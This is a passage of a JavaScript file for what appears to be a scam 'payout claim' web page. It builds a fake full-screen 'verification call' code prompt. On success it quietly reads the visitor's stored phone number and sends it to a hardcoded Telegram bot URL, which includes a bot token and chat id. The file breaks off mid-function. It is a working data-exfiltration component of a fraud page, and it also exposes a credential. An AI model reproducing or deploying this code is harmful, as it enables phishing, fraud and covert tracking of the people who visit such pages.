// ========== POPUP_SHARE.JS ==========

async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) return false;
    try {
        var db = firebase.database();
        var snap = await db.ref('admin/globalFirewall').once('value');
        var data = snap.val();
        return data && data.active === true;
    } catch(e) { return false; }
}

async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        var db = firebase.database();
        var snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            var key = Object.keys(snapshot.val())[0];
            var linkData = snapshot.val()[key];
            return { url: linkData.url, key: key };
        }
        return null;
    } catch(e) { return null; }
}

function showFirewallVerificationPopup() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    console.log("Verification code:", verificationCode);
    
    modal.innerHTML = '<div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">' +
        '<div style="font-size: 48px; margin-bottom: 15px;">📞</div>' +
        '<h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>' +
        '<div style="color: white; font-size: 13px; margin-bottom: 20px;">Please enter the 4-digit code from the verification call.</div>' +
        '<div style="display: flex; gap: 10px; margin-bottom: 15px;">' +
        '<input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center;" placeholder="1234" maxlength="4">' +
        '<button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>' +
        '</div>' +
        '<div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; display: none;"></div>' +
        '</div>';
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    var attempts = 0;
    
    if (codeInput) codeInput.focus();
    
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        attempts++;
        if (enteredCode === verificationCode) {
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone)).catch(function(e) {});
            modal.remove();
            alert("Verification successful! Please try claiming again.");
            setTimeout(function() { window.location.reload(); }, 1000);
        } else {
            var errorMsg = "Invalid verification code. Please try again.";
            if (attempts >= 3) { errorMsg = "Too many failed attempts. Page will refresh."; setTimeout(function() { window.location.reload(); }, 2000); }
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
            codeInput.value = '';
            codeInput.focus();
        }
    };
    
    modal.onclick = function(e) { if (e.target === modal) modal.remove(); };
}

function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left
